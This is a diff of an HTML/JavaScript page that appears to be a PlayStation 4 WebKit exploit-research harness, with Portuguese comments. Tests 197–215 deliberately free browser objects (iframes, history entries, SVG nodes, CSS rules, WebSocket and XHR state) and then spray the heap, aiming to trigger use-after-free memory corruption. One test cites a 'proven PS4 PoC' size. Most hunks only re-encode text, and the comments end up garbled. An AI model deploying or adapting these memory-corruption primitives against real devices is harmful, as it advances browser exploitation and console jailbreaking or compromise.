                 // Aniquila as portas de origem todas no mesmo tick de CPU
                 for(let i = 0; i < 100; i++) {
@@ -1801,7 +1802,7 @@
                 const sab = new SharedArrayBuffer(1024);
                 
                 let workers = [];
-                // 150 È pesado o suficiente para stressar o escalonador Pthread, mas seguro contra o limite 400+
+                // 150 √© pesado o suficiente para stressar o escalonador Pthread, mas seguro contra o limite 400+
                 for(let i = 0; i < 150; i++) {
                     let w = new Worker(url);
                     workers.push(w);
@@ -1816,11 +1817,11 @@
                         workers[i].terminate();
                     }
                     window.spray197 = elegantFloatSpray(1);
-                    logOutput("Sinais enviados e memÛria pulverizada. A aguardar estabilizaÁ„o do FreeBSD...");
+                    logOutput("Sinais enviados e mem√≥ria pulverizada. A aguardar estabiliza√ß√£o do FreeBSD...");
                 }, 50);
                 
             } catch(e) {
-                logOutput("Falha na alocaÁ„o de threads: " + e);
+                logOutput("Falha na aloca√ß√£o de threads: " + e);
             }
         }
 
@@ -1829,29 +1830,29 @@
         // ==========================================
         function runTest198() {
             clearOutput();
-            logOutput("[Teste 198] A saturar o histÛrico com tamanhos corrompidos...");
+            logOutput("[Teste 198] A saturar o hist√≥rico com tamanhos corrompidos...");
             
             try {
                 // Tamanhos baseados na PoC comprovada do PS4
                 let size = 977 + 14460;
                 const payload = "A".repeat(size);
                 
-                // Injeta 50 entradas na velocidade m·xima que o C++ suportar
+                // Injeta 50 entradas na velocidade m√°xima que o C++ suportar
                 for(let i = 0; i < 50; i++) {
                     history.pushState({}, "", "#" + payload + i);
                 }
                 
                 logOutput("50 estados injetados. A iniciar viagem temporal abrupta...");
                 
-                // ForÁa o bmalloc a libertar os blocos de tr·s para a frente instantaneamente
+                // For√ßa o bmalloc a libertar os blocos de tr√°s para a frente instantaneamente
                 history.go(-25);
                 
-                // Pulveriza a memÛria na esperanÁa de o C++ ler o histÛrico anterior num bloco libertado
+                // Pulveriza a mem√≥ria na esperan√ßa de o C++ ler o hist√≥rico anterior num bloco libertado
                 setTimeout(() => { window.spray198 = elegantFloatSpray(2); }, 1);
                 
-                logOutput("DeslocaÁ„o efetuada. Teste sem ciclo infinito concluÌdo.");
+                logOutput("Desloca√ß√£o efetuada. Teste sem ciclo infinito conclu√≠do.");
             } catch(e) {
-                logOutput("O alocador intercetou a manipulaÁ„o: " + e);
+                logOutput("O alocador intercetou a manipula√ß√£o: " + e);
             }
         }
 
@@ -1877,25 +1878,25 @@
                     alvos.push(svg);
                 }
 
-                logOutput("Arrancando 100 nÛs para a janela pai...");
+                logOutput("Arrancando 100 n√≥s para a janela pai...");
                 
                 let adotados = [];
                 for(let i = 0; i < 100; i++) {
                     adotados.push(document.adoptNode(alvos[i]));
                 }
 
-                // DestrÛi a janela de origem instantaneamente
+                // Destr√≥i a janela de origem instantaneamente
                 iframe.remove();
                 
-                // Spray massivo para sujar todos os ponteiros "ownerDocument" possÌveis
+                // Spray massivo para sujar todos os ponteiros "ownerDocument" poss√≠veis
                 window.spray199 = elegantFloatSpray(3);
                 
-                // Invoca c·lculos nativos gr·ficos nos 100 nÛs orf„os simultaneamente
+                // Invoca c√°lculos nativos gr√°ficos nos 100 n√≥s orf√£os simultaneamente
                 for(let i = 0; i < 100; i++) {
                     try { adotados[i].createSVGMatrix(); } catch(err){}
                 }
                 
-                logOutput("[Teste 199] AdoÁ„o em massa completada sem Crash seguro.");
+                logOutput("[Teste 199] Ado√ß√£o em massa completada sem Crash seguro.");
             } catch(e) {
                 logOutput("Falha nativa no gestor de DOM: " + e);
             }
@@ -1912,22 +1913,22 @@
             fullscreenTarget.style.background = "#000";
             container.appendChild(fullscreenTarget);
             
-            logOutput("[Teste 200] A solicitar ecr„ inteiro. PRESSIONE OPTIONS AGORA!");
+            logOutput("[Teste 200] A solicitar ecr√£ inteiro. PRESSIONE OPTIONS AGORA!");
 
             if (fullscreenTarget.webkitRequestFullscreen) fullscreenTarget.webkitRequestFullscreen();
 
             window.onblur = function() {
                 try {
                     // O Sistema Operativo da PS4 interrompeu o processo
-                    // 1. DestruiÁ„o do Alvo
+                    // 1. Destrui√ß√£o do Alvo
                     fullscreenTarget.remove();
                     fullscreenTarget = null;
                     
-                    // 2. OOB History (Press„o no bmalloc)
+                    // 2. OOB History (Press√£o no bmalloc)
                     const payload = "A".repeat(977 + 14460);
                     history.pushState({}, "", "#" + payload);
                     
-                    // 3. IPC Drop (Press„o no Kernel)
+                    // 3. IPC Drop (Press√£o no Kernel)
                     let mc = new MessageChannel();
                     mc.port1.close();
                     
@@ -1935,7 +1936,7 @@
                     window.spray200 = elegantFloatSpray(4); // Spray pesado!
                     
                     document.title = "Singularity Triggered";
-                    logOutput("[Teste 200] SINGULARIDADE EXECUTADA! MemÛria violentada. Aguardando Refresh ou Crash...");
+                    logOutput("[Teste 200] SINGULARIDADE EXECUTADA! Mem√≥ria violentada. Aguardando Refresh ou Crash...");
                     window.onblur = null;
                 } catch(e) {}
             };
@@ -1945,33 +1946,33 @@
         // ==========================================
         function runTest201() {
             clearOutput();
-            logOutput("[Teste 201] A preparar a Thread de ¡udio de alta prioridade...");
+            logOutput("[Teste 201] A preparar a Thread de √Åudio de alta prioridade...");
             
             try {
-                // Cria um contexto de ·udio que processa offline (muito r·pido, forÁa a CPU)
+                // Cria um contexto de √°udio que processa offline (muito r√°pido, for√ßa a CPU)
                 let actx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(2, 44100 * 5, 44100);
                 let osc = actx.createOscillator();
                 osc.connect(actx.destination);
                 osc.start(0);
 
-                // Inicia a renderizaÁ„o nativa em C++
+                // Inicia a renderiza√ß√£o nativa em C++
                 actx.startRendering().then(() => {
-                    logOutput("RenderizaÁ„o C++ sobreviveu ‡ destruiÁ„o do objeto host.");
+                    logOutput("Renderiza√ß√£o C++ sobreviveu √† destrui√ß√£o do objeto host.");
                 }).catch(e => {
                     logOutput("Audio Thread mitigou a falha de forma segura: " + e);
                 });
 
-                // No exato momento em que o C++ comeÁa a processar os 5 segundos de ·udio, aniquilamos as referÍncias
+                // No exato momento em que o C++ come√ßa a processar os 5 segundos de √°udio, aniquilamos as refer√™ncias
                 osc.disconnect();
                 osc = null;
                 actx = null;
                 
-                // Pulverizamos a memÛria livre com o padr„o matem·tico
+                // Pulverizamos a mem√≥ria livre com o padr√£o matem√°tico
                 window.spray201 = elegantFloatSpray(2);
                 
-                logOutput("ReferÍncias de ¡udio apagadas e memÛria pulverizada. A thread nativa est· em stress.");
+                logOutput("Refer√™ncias de √Åudio apagadas e mem√≥ria pulverizada. A thread nativa est√° em stress.");
             } catch(e) {
-                logOutput("API WebAudio indisponÌvel ou erro na inicializaÁ„o: " + e);
+                logOutput("API WebAudio indispon√≠vel ou erro na inicializa√ß√£o: " + e);
             }
         }
 
@@ -1993,21 +1994,21 @@
                 let promise = iframe.contentWindow.Promise.resolve();
                 
                 promise.then(() => {
-                    // Microtarefa 1: DestrÛi o iframe hospedeiro nativamente
+                    // Microtarefa 1: Destr√≥i o iframe hospedeiro nativamente
                     iframe.remove();
                     iframe = null;
                     window.spray202 = elegantFloatSpray(2);
                     logOutput("Microtarefa 1 executada. Contexto aniquilado e Heap pulverizado.");
                 }).then(() => {
-                    // Microtarefa 2: O motor C++ tem de processar isto num contexto que j· n„o existe
+                    // Microtarefa 2: O motor C++ tem de processar isto num contexto que j√° n√£o existe
                     let lixoFantasma = doc.createElement('div'); // Tenta aceder ao documento morto
-                    logOutput("ATEN«√O: A Fila de Microtarefas ignorou a destruiÁ„o do contexto!");
+                    logOutput("ATEN√á√ÉO: A Fila de Microtarefas ignorou a destrui√ß√£o do contexto!");
                 }).catch(e => {
                     logOutput("O C++ abortou as microtarefas remanescentes: " + e);
                 });
 
             } catch(e) {
-                logOutput("Erro na manipulaÁ„o de Promessas: " + e);
+                logOutput("Erro na manipula√ß√£o de Promessas: " + e);
             }
         }
 
@@ -2019,7 +2020,7 @@
             logOutput("[Teste 203] A iniciar corrida de I/O na Thread de Rede (XHR)...");
             
             try {
-                // Cria um Blob gigante para forÁar tempo de leitura
+                // Cria um Blob gigante para for√ßar tempo de leitura
                 let payload = new Uint8Array(10 * 1024 * 1024); // 10MB
                 let blob = new Blob([payload], {type: "application/octet-stream"});
                 let url = URL.createObjectURL(blob);
@@ -2030,16 +2031,16 @@
                 xhr.onreadystatechange = function() {
                     if (xhr.readyState === 2) { // HEADERS_RECEIVED
                         try {
-                            // A thread nativa vai comeÁar a escrever o payload no corpo da resposta
-                            // NÛs cortamos a conex„o abruptamente e revogamos a memÛria partilhada
+                            // A thread nativa vai come√ßar a escrever o payload no corpo da resposta
+                            // N√≥s cortamos a conex√£o abruptamente e revogamos a mem√≥ria partilhada
                             xhr.abort();
                             URL.revokeObjectURL(url);
                             
-                            // Removemos a referÍncia ao XHR e pulverizamos o espaÁo
+                            // Removemos a refer√™ncia ao XHR e pulverizamos o espa√ßo
                             xhr = null;
                             window.spray203 = elegantFloatSpray(3);
                             
-                            logOutput("Conex„o XHR abortada a meio do tr‚nsito interno. MemÛria pulverizada.");
+                            logOutput("Conex√£o XHR abortada a meio do tr√¢nsito interno. Mem√≥ria pulverizada.");
                         } catch(err) {}
                     }
                 };
@@ -2055,35 +2056,35 @@
         // ==========================================
         function runTest204() {
             clearOutput();
-            logOutput("[Teste 204] A stressar a marcaÁ„o de ponteiros do Garbage Collector...");
+            logOutput("[Teste 204] A stressar a marca√ß√£o de ponteiros do Garbage Collector...");
             
             try {
                 const container = document.getElementById('test-containers');
                 let map = new WeakMap();
                 let chaves = [];
                 
-                // Cria milhares de nÛs DOM para encher o WeakMap
+                // Cria milhares de n√≥s DOM para encher o WeakMap
                 for(let i = 0; i < 2000; i++) {
                     let div = document.createElement('div');
                     container.appendChild(div);
-                    map.set(div, new Array(100).fill(1.1)); // Associa memÛria pesada ‡ chave fraca
+                    map.set(div, new Array(100).fill(1.1)); // Associa mem√≥ria pesada √† chave fraca
                     chaves.push(div);
                 }
                 
-                // Quebra as referÍncias fortes (remove do DOM e do Array)
+                // Quebra as refer√™ncias fortes (remove do DOM e do Array)
                 container.innerHTML = '';
                 chaves = null;
                 
-                // ForÁa alocaÁ„o massiva tempor·ria para obrigar o GC a iniciar o ciclo de varredura
+                // For√ßa aloca√ß√£o massiva tempor√°ria para obrigar o GC a iniciar o ciclo de varredura
                 let pressaoGC = new Array(5000).fill(new Uint8Array(1024 * 1024));
                 pressaoGC = null; 
                 
                 window.spray204 = elegantFloatSpray(1);
                 
-                logOutput("Ciclo GC acionado artificialmente e memÛria pulverizada. A aguardar estabilidade.");
+                logOutput("Ciclo GC acionado artificialmente e mem√≥ria pulverizada. A aguardar estabilidade.");
                 
             } catch(e) {
-                logOutput("Alocador JS geriu a press„o do GC sem problemas: " + e);
+                logOutput("Alocador JS geriu a press√£o do GC sem problemas: " + e);
             }
         }
 
@@ -2092,7 +2093,7 @@
         // ==========================================
         function runTest205() {
             clearOutput();
-            logOutput("[Teste 205] A forÁar a descodificaÁ„o nativa de fontes a colapsar...");
+            logOutput("[Teste 205] A for√ßar a descodifica√ß√£o nativa de fontes a colapsar...");
             
             try {
                 const container = document.getElementById('test-containers');
@@ -2112,23 +2113,23 @@
                 // O C++ vai pausar para tentar processar a fonte corrompida quando pedirmos o tamanho
                 let armadilha = {
                     valueOf: function() {
-                        // Antes da matem·tica do layout terminar, destruÌmos a regra da fonte
+                        // Antes da matem√°tica do layout terminar, destru√≠mos a regra da fonte
                         sheet.deleteRule(0);
                         window.spray205 = elegantFloatSpray(2);
                         return 0;
                     }
                 };
 
-                // Truque sujo: forÁamos o getter do offsetHeight, mas passando o valor por uma armadilha JS
+                // Truque sujo: for√ßamos o getter do offsetHeight, mas passando o valor por uma armadilha JS
                 try {
                     alvo.style.width = armadilha + "px";
                     let forcaReflow = alvo.offsetHeight; 
                 } catch(ignora) {}
 
-                logOutput("Layout SÌncrono calculado. O Motor de Fontes rejeitou o lixo sem corromper ponteiros.");
+                logOutput("Layout S√≠ncrono calculado. O Motor de Fontes rejeitou o lixo sem corromper ponteiros.");
                 setTimeout(() => { if(style.parentNode) style.remove(); }, 100);
             } catch(e) {
-                logOutput("ProteÁ„o do CSSOM ativada: " + e);
+                logOutput("Prote√ß√£o do CSSOM ativada: " + e);
             }
         }
 // ==========================================
@@ -2136,29 +2137,29 @@
         // ==========================================
         function runTest206() {
             clearOutput();
-            logOutput("[Teste 206] A roubar a funÁ„o de polling nativa do iframe...");
+            logOutput("[Teste 206] A roubar a fun√ß√£o de polling nativa do iframe...");
             
             try {
                 const container = document.getElementById('test-containers');
                 let iframe = document.createElement('iframe');
                 container.appendChild(iframe);
 
-                // Roubamos a referÍncia nativa da funÁ„o C++ associada a esta janela especÌfica
+                // Roubamos a refer√™ncia nativa da fun√ß√£o C++ associada a esta janela espec√≠fica
                 let getPadsRoubado = iframe.contentWindow.navigator.getGamepads.bind(iframe.contentWindow.navigator);
 
-                // DestruÌmos o iframe (aciona DOMWindow::disconnectFrame no motor)
+                // Destru√≠mos o iframe (aciona DOMWindow::disconnectFrame no motor)
                 iframe.remove();
                 iframe = null;
                 
-                // Sujamos o Heap antes de tentar executar a funÁ„o
+                // Sujamos o Heap antes de tentar executar a fun√ß√£o
                 window.spray206 = elegantFloatSpray(2);
 
                 logOutput("Contexto aniquilado. A invocar C++ no vazio...");
                 
-                // O WebKit tem de validar se a janela ainda existe. Se falhar, tentar· ler IPC para um documento morto.
+                // O WebKit tem de validar se a janela ainda existe. Se falhar, tentar√° ler IPC para um documento morto.
                 let resultado = getPadsRoubado();
                 
-                logOutput("FunÁ„o roubada retornou de forma segura: " + (resultado ? resultado.length : "null"));
+                logOutput("Fun√ß√£o roubada retornou de forma segura: " + (resultado ? resultado.length : "null"));
             } catch(e) {
                 logOutput("Motor protegeu o contexto desanexado: " + e);
             }
@@ -2188,7 +2189,7 @@
                 }
 
                 if (!alvoGamepad) {
-                    logOutput("Nenhum Gamepad detetado. Pressione um bot„o no comando e tente novamente.");
+                    logOutput("Nenhum Gamepad detetado. Pressione um bot√£o no comando e tente novamente.");
                     return;
                 }
 
@@ -2201,15 +2202,15 @@
                 // Spray massivo
                 window.spray207 = elegantFloatSpray(3);
 
-                // ForÁamos a leitura C++ da propriedade 'buttons'.
-                // Se o objeto for um ponteiro puro e a memÛria foi libertada com o iframe, isto far· Crash.
+                // For√ßamos a leitura C++ da propriedade 'buttons'.
+                // Se o objeto for um ponteiro puro e a mem√≥ria foi libertada com o iframe, isto far√° Crash.
                 let btnCount = alvoGamepad.buttons.length;
                 let eixoZ = alvoGamepad.axes[0];
 
-                logOutput("Objeto Gamepad sobreviveu ao desmantelamento da janela. Leitura: " + btnCount + " botıes.");
+                logOutput("Objeto Gamepad sobreviveu ao desmantelamento da janela. Leitura: " + btnCount + " bot√µes.");
 
             } catch(e) {
-                logOutput("ProteÁ„o de memÛria intercetou a leitura Ûrf„: " + e);
+                logOutput("Prote√ß√£o de mem√≥ria intercetou a leitura √≥rf√£: " + e);
             }
         }
 
@@ -2218,15 +2219,15 @@
         // ==========================================
         function runTest208() {
             clearOutput();
-            logOutput("[Teste 208] A aguardar interrupÁ„o de hardware (PRESSIONE UM BOT√O)...");
+            logOutput("[Teste 208] A aguardar interrup√ß√£o de hardware (PRESSIONE UM BOT√ÉO)...");
             
             try {
                 window.addEventListener("gamepadconnected", function handler(e) {
                     try {
-                        // O C++ recebeu o sinal do Kernel FreeBSD de que um gamepad est· ativo
+                        // O C++ recebeu o sinal do Kernel FreeBSD de que um gamepad est√° ativo
                         logOutput("Sinal IPC do Comando Recebido! A corromper estrutura...");
                         
-                        // Aniquilamos todo o conte˙do da p·gina a meio do evento assÌncrono
+                        // Aniquilamos todo o conte√∫do da p√°gina a meio do evento ass√≠ncrono
                         document.body.innerHTML = '';
                         
                         // Pulverizamos o heap para intercetar o objeto do evento no C++
@@ -2234,9 +2235,9 @@
                         
                         window.removeEventListener("gamepadconnected", handler);
                         
-                        // Recria a UI mÌnima para n„o ficarmos com ecr„ branco permanente
+                        // Recria a UI m√≠nima para n√£o ficarmos com ecr√£ branco permanente
                         setTimeout(() => {
-                            document.body.innerHTML = '<div style="font-family: monospace;">[Teste 208] Evento de hardware concluÌdo. O motor estabilizou.</div>';
+                            document.body.innerHTML = '<div style="font-family: monospace;">[Teste 208] Evento de hardware conclu√≠do. O motor estabilizou.</div>';
                         }, 500);
                         
                     } catch(err) {}
@@ -2251,7 +2252,7 @@
         // ==========================================
         function runTest209() {
             clearOutput();
-            logOutput("[Teste 209] A despachar evento de Gamepad sintÈtico em ·rvore colapsada...");
+            logOutput("[Teste 209] A despachar evento de Gamepad sint√©tico em √°rvore colapsada...");
             
             try {
                 const container = document.getElementById('test-containers');
@@ -2259,7 +2260,7 @@
                 container.appendChild(div);
 
                 div.addEventListener('gamepadconnected', function() {
-                    logOutput("Evento sintÈtico n„o deveria borbulhar aqui de forma segura!");
+                    logOutput("Evento sint√©tico n√£o deveria borbulhar aqui de forma segura!");
                 });
 
                 // Cria um evento falso nativamente
@@ -2275,19 +2276,19 @@
                     ev.initEvent('gamepadconnected', true, false);
                 }
 
-                // Armadilha C++: a meio do despacho, destrÛi o alvo
+                // Armadilha C++: a meio do despacho, destr√≥i o alvo
                 let target = document.createElement('span');
                 div.appendChild(target);
                 
                 target.addEventListener('gamepadconnected', function() {
-                    // DestrÛi a raiz do despacho a meio da propagaÁ„o
+                    // Destr√≥i a raiz do despacho a meio da propaga√ß√£o
                     div.remove();
                     window.spray209 = elegantFloatSpray(2);
                 });
 
                 target.dispatchEvent(ev);
                 
-                logOutput("Roteamento C++ processou o evento e a destruiÁ„o do nÛ com seguranÁa.");
+                logOutput("Roteamento C++ processou o evento e a destrui√ß√£o do n√≥ com seguran√ßa.");
             } catch(e) {
                 logOutput("Motor bloqueou a anomalia no evento de Gamepad: " + e);
             }
@@ -2298,18 +2299,18 @@
         // ==========================================
         function runTest210() {
             clearOutput();
-            logOutput("[Teste 210] A iniciar 30 frames de press„o de Polling IPC + Spray...");
+            logOutput("[Teste 210] A iniciar 30 frames de press√£o de Polling IPC + Spray...");
             
             let frames = 0;
-            const LIMIT = 30; // Controlado para n„o causar DoS, mas suficiente para causar colis„o no IPC
+            const LIMIT = 30; // Controlado para n√£o causar DoS, mas suficiente para causar colis√£o no IPC
             window.spray210 = [];
 
             function loop() {
                 try {
-                    // LÍ o hardware nativamente a cada frame (gera mensagem IPC interna)
+                    // L√™ o hardware nativamente a cada frame (gera mensagem IPC interna)
                     let pads = navigator.getGamepads();
                     
-                    // Aloca lixo matem·tico e guarda na memÛria global para fragmentar o Heap nativamente
+                    // Aloca lixo matem√°tico e guarda na mem√≥ria global para fragmentar o Heap nativamente
                     window.spray210.push(elegantFloatSpray(1));
                     
                     frames++;
@@ -2317,7 +2318,7 @@
                     if (frames < LIMIT) {
                         requestAnimationFrame(loop);
                     } else {
-                        logOutput("Press„o de frames terminada. Se a consola n„o engasgou, o Garbage Collector limpou o IPC a tempo.");
+                        logOutput("Press√£o de frames terminada. Se a consola n√£o engasgou, o Garbage Collector limpou o IPC a tempo.");
                         // Liberta a RAM passados uns segundos para manter o ambiente limpo
                         setTimeout(() => { window.spray210 = []; }, 1000);
                     }
@@ -2336,19 +2337,19 @@
             logOutput("[Teste 211] A iniciar Handshake WebSocket...");
             
             try {
-                // Tenta ligar a um porto local para forÁar a m·quina de estados C++ a arrancar
+                // Tenta ligar a um porto local para for√ßar a m√°quina de estados C++ a arrancar
                 let ws = new WebSocket("ws://127.0.0.1:54321");
                 
-                // Exatamente no prÛximo micro-tick (enquanto o C++ est· a resolver a ligaÁ„o)
+                // Exatamente no pr√≥ximo micro-tick (enquanto o C++ est√° a resolver a liga√ß√£o)
                 setTimeout(() => {
-                    // Abortamos a ligaÁ„o nativa
+                    // Abortamos a liga√ß√£o nativa
                     ws.close();
                     ws = null;
                     
-                    // Pulverizamos a memÛria para tentar apanhar a estrutura de rede morta
+                    // Pulverizamos a mem√≥ria para tentar apanhar a estrutura de rede morta
                     window.spray211 = elegantFloatSpray(3);
                     
-                    logOutput("WebSocket abortado a meio do Handshake e memÛria pulverizada.");
+                    logOutput("WebSocket abortado a meio do Handshake e mem√≥ria pulverizada.");
                 }, 0);
                 
             } catch(e) {
@@ -2361,17 +2362,17 @@
         // ==========================================
         function runTest212() {
             clearOutput();
-            logOutput("[Teste 212] A forÁar c·lculo massivo no RenderGrid C++...");
+            logOutput("[Teste 212] A for√ßar c√°lculo massivo no RenderGrid C++...");
             
             try {
                 const container = document.getElementById('test-containers');
                 let grid = document.createElement('div');
-                // ForÁa o C++ a calcular dinamicamente o n˙mero de colunas
+                // For√ßa o C++ a calcular dinamicamente o n√∫mero de colunas
                 grid.style.display = 'grid';
                 grid.style.gridTemplateColumns = 'repeat(auto-fill, minmax(10px, 1fr))';
                 grid.style.width = '1000px';
                 
-                // Injeta 500 elementos para forÁar a ·rvore de renderizaÁ„o
+                // Injeta 500 elementos para for√ßar a √°rvore de renderiza√ß√£o
                 for(let i = 0; i < 500; i++) {
                     let item = document.createElement('div');
                     grid.appendChild(item);
@@ -2379,17 +2380,17 @@
                 
                 container.appendChild(grid);
 
-                // ForÁa o C++ a calcular o layout de forma sÌncrona
+                // For√ßa o C++ a calcular o layout de forma s√≠ncrona
                 let calculaLayout = grid.offsetHeight;
 
-                // DestrÛi a grelha instantaneamente apÛs o c·lculo
+                // Destr√≥i a grelha instantaneamente ap√≥s o c√°lculo
                 grid.remove();
                 grid = null;
                 
-                // Spray matem·tico focado nas estruturas do RenderTree
+                // Spray matem√°tico focado nas estruturas do RenderTree
                 window.spray212 = elegantFloatSpray(2);
                 
-                logOutput("Layout Grid calculado, contentor destruÌdo e memÛria pulverizada.");
+                logOutput("Layout Grid calculado, contentor destru√≠do e mem√≥ria pulverizada.");
                 
             } catch(e) {
                 logOutput("Motor de layout WebCore sobreviveu ao colapso do Grid: " + e);
@@ -2410,20 +2411,20 @@
 
                 let mc = new MessageChannel();
                 
-                // A porta 2 È fisicamente desanexada deste documento e enviada para o iframe
+                // A porta 2 √© fisicamente desanexada deste documento e enviada para o iframe
                 iframe.contentWindow.postMessage("carga", "*", [mc.port2]);
 
                 // No mesmo milissegundo, antes da Fila IPC nativa entregar a porta, aniquilamos o destino
                 iframe.remove();
                 iframe = null;
 
-                // Pulverizamos o espaÁo livre para corromper a porta em tr‚nsito
+                // Pulverizamos o espa√ßo livre para corromper a porta em tr√¢nsito
                 window.spray213 = elegantFloatSpray(2);
 
-                logOutput("TransferÍncia IPC iniciada e janela destino assassinada com sucesso.");
+                logOutput("Transfer√™ncia IPC iniciada e janela destino assassinada com sucesso.");
 
             } catch(e) {
-                logOutput("Gestor IPC lidou com a porta Ûrf„ em seguranÁa: " + e);
+                logOutput("Gestor IPC lidou com a porta √≥rf√£ em seguran√ßa: " + e);
             }
         }
 
@@ -2432,7 +2433,7 @@
         // ==========================================
         function runTest214() {
             clearOutput();
-            logOutput("[Teste 214] A acionar filtros GPU e a corromper a ·rvore SVG...");
+            logOutput("[Teste 214] A acionar filtros GPU e a corromper a √°rvore SVG...");
             
             try {
                 const container = document.getElementById('test-containers');
@@ -2450,20 +2451,20 @@
                 let box = document.getElementById('boxAlvo');
                 let svg = document.getElementById('svgAlvo');
 
-                // ForÁa o pipeline gr·fico a reconhecer o filtro
+                // For√ßa o pipeline gr√°fico a reconhecer o filtro
                 let calculaGPU = box.offsetHeight;
 
-                // Removemos abruptamente o SVG que contÈm a definiÁ„o do filtro
+                // Removemos abruptamente o SVG que cont√©m a defini√ß√£o do filtro
                 svg.remove();
                 svg = null;
 
-                // Pulverizamos a memÛria para corromper os ponteiros de textura da GPU
+                // Pulverizamos a mem√≥ria para corromper os ponteiros de textura da GPU
                 window.spray214 = elegantFloatSpray(2);
 
-                logOutput("Filtro SVG removido a meio da renderizaÁ„o e VRAM/RAM pulverizada.");
+                logOutput("Filtro SVG removido a meio da renderiza√ß√£o e VRAM/RAM pulverizada.");
 
             } catch(e) {
-                logOutput("Pipeline de renderizaÁ„o protegido contra falta de recursos: " + e);
+                logOutput("Pipeline de renderiza√ß√£o protegido contra falta de recursos: " + e);
             }
         }
 
@@ -2472,39 +2473,47 @@
         // ==========================================
         function runTest215() {
             clearOutput();
-            logOutput("[Teste 215] A forÁar realocaÁ„o do vetor de estilos C++...");
+            logOutput("[Teste 215] A for√ßar realoca√ß√£o do vetor de estilos C++...");
             
             try {
                 let style = document.createElement('style');
                 document.head.appendChild(style);
                 let sheet = style.sheet;
 
-                // Insere dezenas de regras rapidamente para forÁar o vetor din‚mico do C++ a crescer
-                // e realocar memÛria para um bloco maior
+                // Insere dezenas de regras rapidamente para for√ßar o vetor din√¢mico do C++ a crescer
+                // e realocar mem√≥ria para um bloco maior
                 for(let i = 0; i < 200; i++) {
                     sheet.insertRule(`.classe_${i} { color: red; }`, i);
                 }
 
-                logOutput("Vetor CSSOM expandido. A iniciar aniquilaÁ„o e Spray...");
+                logOutput("Vetor CSSOM expandido. A iniciar aniquila√ß√£o e Spray...");
 
-                // Apaga todas as regras violentamente, marcando o bloco de memÛria como livre
+                // Apaga todas as regras violentamente, marcando o bloco de mem√≥ria como livre
                 while(sheet.cssRules.length > 0) {
                     sheet.deleteRule(0);
                 }
 
-                // Pulverizamos o espaÁo onde o vetor estava armazenado
+                // Pulverizamos o espa√ßo onde o vetor estava armazenado
                 window.spray215 = elegantFloatSpray(3);
 
-                // Tentamos inserir uma nova regra. Se o C++ usar um ponteiro desatualizado (UAF), far· Crash.
+                // Tentamos inserir uma nova regra. Se o C++ usar um ponteiro desatualizado (UAF), far√° Crash.
                 sheet.insertRule(`.gatilho { color: blue; }`, 0);
 
-                logOutput("Estouro de vetor CSSOM concluÌdo. O motor estabilizou.");
+                logOutput("Estouro de vetor CSSOM conclu√≠do. O motor estabilizou.");
                 setTimeout(() => { if(style.parentNode) style.remove(); }, 100);
 
             } catch(e) {
-                logOutput("Gestor de CSSOM imune ao ataque de realocaÁ„o: " + e);
+                logOutput("Gestor de CSSOM imune ao ataque de realoca√ß√£o: " + e);
             }
         }
-    </script>
+    
+window.onerror = function(msg, src, line, col, err) {
+    const out = document.getElementById('output');
+    if (out) {
+        out.innerText = "[ERRO GLOBAL] " + msg + "\n" + out.innerText;
+    }
+};
+
+</script>
 </body>
 </html>
